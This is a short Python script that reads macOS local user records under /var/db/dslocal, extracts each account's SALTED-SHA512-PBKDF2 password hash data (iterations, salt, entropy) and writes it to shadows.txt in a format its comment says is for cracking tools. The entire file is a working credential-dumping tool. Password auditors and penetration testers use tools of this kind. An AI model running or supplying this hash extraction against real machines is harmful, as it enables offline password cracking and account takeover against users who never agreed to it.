#/usr/bin/env python3

import os
import sys
import plistlib

def get_plist_list(path):
    plist_files = None
    try:
        plist_files = os.listdir(path)
    except PermissionError:
        print("[-]You have to be admin to read password files")
    return plist_files


if __name__ == "__main__":
    # List files in /var/db/dslocal/nodes/Default/users/
    path = "/var/db/dslocal/nodes/Default/users/"
    plist_files = get_plist_list(path)
    if not plist_files:
        sys.exit(-1)

    res = dict()

    for plist in plist_files:
        # For each file, decode the plist and get data inside the <hash data> xml key
        #print("Parsing file {}".format(plist))
        with open(os.path.join(path, plist), 'rb') as f:
            parsed_data = plistlib.load(f)

        if not parsed_data:
            print("[-]Parsed data seems to be empty for file {}".format(os.path.join(path, plist)))
            continue

        if 'ShadowHashData' in parsed_data:
            account = plist.split('.plist')[0]
            print("Found ShadowHashData for account: {}".format(account))
            shadow_data = plistlib.loads(parsed_data['ShadowHashData'][0])
            #print(shadow_data)
            # Extract data related to keys: entropy, iterations and salt
            if 'SALTED-SHA512-PBKDF2' in shadow_data:
                iterations = shadow_data['SALTED-SHA512-PBKDF2']['iterations']
                salt = shadow_data['SALTED-SHA512-PBKDF2']['salt']
                entropy = shadow_data['SALTED-SHA512-PBKDF2']['entropy']
                if not (iterations and salt and entropy):
                    print("[-]Something is wrong, checkout logs")
                    continue
                salt = salt.hex()
                entropy = entropy.hex()

                res[account] = [iterations, salt, entropy]
            else:
                print("[-]Could not find SALTED-SHA512-PBKDF2 key in ShadowHashData, checkout output: {}"
                      .format(shadow_data))

    # Generate output script so it can be processed by cracking tools:
    print("Now writing results in shadows.txt ")
    # user:$ml$<iterations>$<salt>$<entropy>
    with open('shadows.txt', 'wt') as f:
        for name, values in res.items():
            f.write("{user}:$ml${iter}${salt}${ent}\n".format(user=name, iter=values[0],
                    salt=values[1], ent=values[2]))
    print("Done")
